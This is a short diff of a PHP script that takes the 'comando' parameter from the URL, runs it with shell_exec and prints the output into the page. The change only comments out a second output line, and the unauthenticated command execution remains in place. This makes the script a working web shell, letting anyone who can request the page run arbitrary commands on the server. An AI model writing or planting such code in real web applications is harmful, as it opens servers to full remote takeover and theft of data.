@@ -17,5 +17,5 @@ $comand = $_GET['comando'];
 $output = shell_exec($comand);
 //$output = suexec($comand);
 echo "<p>$output</p>";
-echo "<pre>$output</pre>";
+//echo "<pre>$output</pre>";
 ?>
